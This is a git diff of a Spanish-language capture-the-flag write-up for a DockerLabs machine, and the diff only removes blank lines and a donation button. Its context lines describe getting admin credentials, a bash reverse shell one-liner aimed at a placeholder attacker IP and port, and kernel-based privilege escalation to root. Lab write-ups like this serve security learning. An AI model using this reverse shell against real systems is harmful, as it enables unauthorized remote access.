@@ -56,7 +56,6 @@ La misma funcion nos entrega las credenciales de acceso. Usuario **"admin"** y l
 
 ![img11]({{ site.baseurl }}/assets/img/deloitte2/13.png)
 
-
 En el segundo enlace, **login_2** nos solicitarán nuevamente credenciales, al ingresar las anteriores y nos muestra un error del servidor
 
 ![img12]({{ site.baseurl }}/assets/img/deloitte2/14.png)
@@ -128,7 +127,6 @@ Confirmando que existe, nos crearemos una Reverse Shell para conectarnos al serv
 
 Se probaron distintos payloads de reverse shell. El segundo payload permitió una conexión más estable, ya que redirige explícitamente la entrada, salida y errores estándar hacia el socket TCP, evitando problemas comunes al ejecutar shells interactivas desde aplicaciones web.
 
-
 `bash -c "bash -i >/dev/tcp/<IP_ATACANTE>/<PUERTO> 0<&1 2>&1 &"`
 
 una vez conectados buscaremos vulnerabilidades relacionadas con la versión del kernel de la máquina víctima.
@@ -161,8 +159,6 @@ Ahora solo nos queda navegar al directorio root y obtener la última bandera.
 
 ☕ ¿Te sirvió el Write-up?
 Si este contenido te ayudó a rootear la máquina o a aprender algo nuevo, ¡puedes invitarme un café! Todo el apoyo se va directo a mejorar el blog y seguir subiendo retos de DockerLabs.
-
-![Invitame un café](https://img.buymeacoffee.com/button-api/?text=Invítame un café&emoji=☕&slug=TU_USUARIO&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff)
 
 ---
 
